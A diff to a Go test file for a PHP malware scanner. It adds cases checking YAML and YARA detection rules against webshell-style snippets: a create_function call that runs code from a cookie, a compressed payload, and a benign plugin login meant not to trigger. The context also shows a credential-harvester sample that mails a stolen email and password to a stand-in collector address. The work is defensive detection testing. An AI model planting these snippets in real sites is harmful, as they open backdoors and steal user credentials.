@@ -1727,6 +1727,31 @@ func TestRenamedYARARuleClaims(t *testing.T) {
 			wantYARAHit: true,
 		},
 		{
+			name:        "dynamic callback body with nonempty parameters",
+			yamlRule:    "obfuscation_create_function",
+			yaraRule:    "obfuscation_create_function_exec",
+			ext:         ".php",
+			sample:      `<?php $f = create_function('$a', $_COOKIE['code']); $f(1);`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:        "dynamic callback compressed body",
+			yamlRule:    "obfuscation_create_function",
+			yaraRule:    "obfuscation_create_function_exec",
+			ext:         ".php",
+			sample:      `<?php $f = create_function('$a', gzuncompress($payload)); $f(1);`,
+			wantYAMLHit: true,
+			wantYARAHit: true,
+		},
+		{
+			name:     "dynamic callback wrapper with request validation",
+			yamlRule: "obfuscation_create_function",
+			yaraRule: "obfuscation_create_function_exec",
+			ext:      ".php",
+			sample:   `<?php function create_function($args, $code) { if (isset($_SERVER['REQUEST_METHOD'])) { validate($code); } return \create_function($args, $code); }`,
+		},
+		{
 			name:        "stream wrapper filter arm",
 			yamlRule:    "dropper_php_stream_wrapper",
 			yaraRule:    "dropper_stream_wrapper_abuse",
@@ -2101,6 +2126,23 @@ $p = $_POST['password'];
 mail('drop@collector.example.test', 'result', "$e|$p");`,
 			wantYAMLHit: true,
 			wantYARAHit: true,
+		},
+		{
+			name:     "plugin signing in to its vendor cloud account",
+			yamlRule: "credential_mailer",
+			yaraRule: "credential_harvester_php",
+			ext:      ".php",
+			// Both credential fields are posted and the only "mail(" in the
+			// file is the tail of an identifier. Neither engine may fire.
+			sample: `<?php
+public function get_user_email() { return sanitize_email( $this->user_email ); }
+public function connect() {
+	$email    = isset( $_POST['email'] ) ? sanitize_email( wp_unslash( $_POST['email'] ) ) : '';
+	$password = isset( $_POST['password'] ) ? $_POST['password'] : '';
+	return wp_remote_post( $this->api . '/login', array( 'email' => $email, 'password' => $password ) );
+}`,
+			wantYAMLHit: false,
+			wantYARAHit: false,
 		},
 		{
 			name:        "hidden pharmacy doorway",
